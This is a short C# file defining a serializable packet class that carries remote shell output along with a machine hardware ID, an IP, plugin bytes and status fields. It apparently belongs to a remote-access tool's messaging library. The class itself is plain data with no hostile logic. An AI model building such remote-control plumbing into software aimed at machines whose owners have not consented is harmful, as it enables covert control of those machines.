using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class StdOutShellSessionPacket : IPacket
    {
        public StdOutShellSessionPacket(string shellStdOut) : base()
        {
            this.packetType = PacketType.SHELL_COMMAND;
            this.shellStdOut = shellStdOut;   
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public string shellStdOut { get; set; }
    }
}
